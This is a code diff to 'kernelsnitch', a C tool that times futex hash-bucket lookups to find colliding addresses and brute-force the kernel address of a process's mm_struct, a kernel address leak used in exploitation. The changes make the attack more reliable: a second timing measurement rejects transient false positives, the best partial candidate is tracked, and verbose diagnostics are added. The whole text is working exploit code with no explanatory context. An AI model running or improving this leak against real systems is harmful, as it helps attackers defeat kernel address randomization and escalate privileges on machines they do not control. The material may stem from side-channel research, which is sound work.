@@ -62,6 +62,8 @@ struct kernelsnitch_shared_state {
     volatile size_t *times;
     volatile size_t found;
     volatile size_t mm_struct;
+    volatile size_t best_match;
+    volatile size_t best_cand;
 
     pthread_t *tids;
     size_t identity_diff;
@@ -184,8 +186,14 @@ static void *__mm_leak(void *arg)
                 size_t found_hash = 1;
                 if (!ks->mte_enabled) {
                     // test the mm_struct candidate
-                    for (size_t i = 1; i < ks->collisions && found_hash; ++i)
-                        found_hash = (futex_hash(ks->futex_addrs[0], mm_struct_candidate) == futex_hash(ks->futex_addrs[i], mm_struct_candidate));
+                    size_t matches = 0;
+                    for (size_t i = 1; i < ks->collisions; ++i)
+                        matches += (futex_hash(ks->futex_addrs[0], mm_struct_candidate) == futex_hash(ks->futex_addrs[i], mm_struct_candidate));
+                    if (matches > ks->best_match) {
+                        ks->best_match = matches;
+                        ks->best_cand = mm_struct_candidate;
+                    }
+                    found_hash = (matches == ks->collisions - 1);
                     if (found_hash) {
                         ks->mm_struct = mm_struct_candidate;
                         ks->found = 1;
@@ -233,6 +241,8 @@ struct kernelsnitch_shared_state *kernelsnitch_setup(size_t __mm_struct_sz, size
 {
     struct kernelsnitch_shared_state *ks = SYSCHK(mmap(0, sizeof(struct kernelsnitch_shared_state), PROT_WRITE|PROT_READ, MAP_ANON|MAP_SHARED, -1, 0));
     ks->mm_struct = -1;
+    ks->best_match = 0;
+    ks->best_cand = 0;
     ks->mm_struct_sz = __mm_struct_sz;
     ks->mm_slab_order = __mm_slab_order;
     ks->cpu_cnt = sysconf(_SC_NPROCESSORS_ONLN)*2;
@@ -286,11 +296,12 @@ void kernelsnitch_find_collisions(struct kernelsnitch_shared_state *ks)
     wanted = ks->collisions - 1;
 
     size_t approx_time = MIN(__measure((size_t)&ks->futexes[0]), __measure((size_t)&ks->futexes[KS_PAGE_SIZE+8]));
+    size_t above_cnt = 0;
 
     // piled-up hash bucket ID 128
     // here, I append 4096 futexes to this hash bucket creating a distinction between most other empty or lightly populated ones
     __increase(ks, ID, APPENDED_FUTEXES);
-    if (ks->verbose) pr_info("start finding collisisons\n");
+    if (ks->verbose) pr_info("start finding collisisons approx=%zu\n", approx_time);
 
     // find futex user space address which collide with the piled-up hash bucket ID 128
     ks->futex_addrs[0] = (size_t)&ks->inc_futex[ID];
@@ -302,11 +313,26 @@ void kernelsnitch_find_collisions(struct kernelsnitch_shared_state *ks)
         futex_addr = (size_t)&ks->futexes[id];
         ks->times[i] = __measure(futex_addr);
         if (ks->times[i] > (approx_time*KERNELSNITCH_THRESHOLD_MULT)) {
+            above_cnt++;
+            /* Confirm with a second independent measurement: a transient
+             * scheduling hiccup (busy device, pinned children) makes a
+             * non-colliding bucket look slow for one burst, and a single
+             * false address poisons the whole bruteforce (no candidate
+             * can satisfy every hash equation). */
+            size_t confirm = __measure(futex_addr);
+            if (confirm <= (approx_time*KERNELSNITCH_THRESHOLD_MULT)) {
+                if (ks->verbose) pr_info("  reject transient %016zx\n", futex_addr);
+                continue;
+            }
             count++;
             ks->futex_addrs[count] = futex_addr;
-            if (ks->verbose) pr_info("  %016zx\n", futex_addr);
+            if (ks->verbose) pr_info("  %016zx t=%zu confirm=%zu\n", futex_addr, ks->times[i], confirm);
         }
     }
+    if (ks->verbose)
+        pr_info("scan done above=%zu empty_t=%zu pile_t=%zu\n", above_cnt,
+                __measure((size_t)&ks->futexes[0]),
+                __measure((size_t)&ks->inc_futex[ID]));
     if (wanted == count) {
         if (ks->verbose) pr_info("found %zd collisisons\n", count);
         ks->state = KERNELSNITCH_COLLISIONS_FOUND;
@@ -345,6 +371,10 @@ void kernelsnitch_bruteforce(struct kernelsnitch_shared_state *ks)
     }
     for (size_t i = 0; i < ks->thread_cnt; ++i)
         pthread_join(ks->tids[i], 0);
+    if (ks->verbose)
+        pr_info("bruteforce best_match=%zu/%zu cand=%016zx found=%d\n",
+                ks->best_match, ks->collisions - 1, ks->best_cand,
+                (int)(ks->mm_struct != (size_t)-1));
     ks->state = (ks->mm_struct == (size_t)-1) ? KERNELSNITCH_MM_NOT_FOUND : KERNELSNITCH_MM_FOUND;
 }
 
